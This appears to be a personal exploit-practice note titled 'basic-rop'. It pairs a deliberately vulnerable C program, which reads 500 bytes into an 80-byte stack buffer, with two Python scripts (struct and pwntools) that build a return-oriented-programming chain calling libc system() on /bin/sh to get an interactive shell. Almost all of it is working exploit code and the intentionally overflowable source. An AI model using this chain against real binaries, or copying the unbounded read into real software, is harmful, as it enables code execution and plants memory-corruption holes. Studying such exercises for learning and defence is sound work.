
# basic-rop

## source

```C
// rop.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int overflow() {
	char buf[80];
	int r;

	read( 0, buf, 500 );
	printf("the buffer content %d, %s\n", r, buf );
	
	return 0;
}

int main(int argc, char const *argv[])
{
	printf("starting /bin/ls\n");
	overflow();
	return 0;
}
```


## payload generation script

```python
#!/usr/bin/python
from struct import *

buffer = b''
buffer += b'A'*104
buffer += pack( "<Q", 0x000055555555522b)	# ROP gadget: pop rdi; ret
# stack frame is reset when we ret to 0x000055555555522b
buffer += pack( "<Q", 0x7ffff7f6c882) 		# pointer to /bin/sh  
# 0x7ffff7de9a8d id                         # this works, PATH is set for system()
buffer += pack( "<Q", 0x7ffff7e1d860) 		# address of libc function, system()
f = open( "rop.txt", "wb" )
f.write( buffer )
```


## pwntools variant

> produces a **stable** interactive shell

```python
#!/usr/bin/python
from pwn import *

binary = ELF( "./rop" )
proc = process( "./rop" )

# p64() does little endian packing and addr normalization
pop_rdi_ret = p64( 0x000055555555522b )
bin_sh_str = p64( 0x7ffff7f6c882 )
libc_system = p64( 0x7ffff7e1d860 )

rop = b'A'*104
rop += pop_rdi_ret
rop += bin_sh_str
rop += libc_system

proc.sendline( rop )
proc.interactive()

# references
# """
# https://anee.me/advanced-rop-techniques-16fd701909b5
# https://youtu.be/1MDqn1kBHQM
# """
```

